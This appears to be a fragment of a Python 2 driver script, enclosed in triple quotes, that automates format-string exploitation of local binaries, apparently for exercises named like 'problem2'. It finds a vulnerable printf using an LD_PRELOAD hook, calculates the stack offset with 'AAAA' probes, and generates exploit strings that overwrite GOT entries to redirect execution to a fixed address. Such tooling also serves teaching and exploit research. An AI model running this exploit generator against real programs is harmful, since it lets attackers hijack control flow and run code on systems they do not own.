
'''
	#binaryName = os.environ["PWD"] + "/binaries/newproblem1";	
	#binaryName = os.environ["PWD"] + "/binaries/problem2";	
	#exportShellCode();

	#Remove Temporary files
	removeTempFiles();

	# Find vulnerable printf
	parseAddressSpace(binaryName);	
	
	prepareSharedLibrary();
	os.environ["LD_PRELOAD"] = os.environ["PWD"] + "/customFormatFunctions.so";
	output = executeProgram(binaryName, "test");
	del os.environ["LD_PRELOAD"];

	findVulnPrintf();
	
	# Find Offset 
	r = calculateOffset(binaryName, "AAAA");	
	dummyString = "AAAA";
	if(r == -1):
		r = calculateOffset(binaryName, "AAAAA");
		dummyString = "AAAAA";
		if(r == -1):
			print("Cannot find offset");
			dummyString = "";
	
	# Prepare dummy String
	if r != -1 :
		exploitString = prepareFormatString(dummyString,"0804856d","08049fa0",r);
		print exploitString;	


	# Potential Exploit Strings based on GOT addresses
	
	gotAddresses = findAllGOTAddresses(binaryName);
	for i in range(len(gotAddresses)):
		exploit = prepareFormatString(dummyString,"0804856d",gotAddresses[i],r);	
		print("Exploit %d: %s\n-------" % ((i+1), exploit));
'''

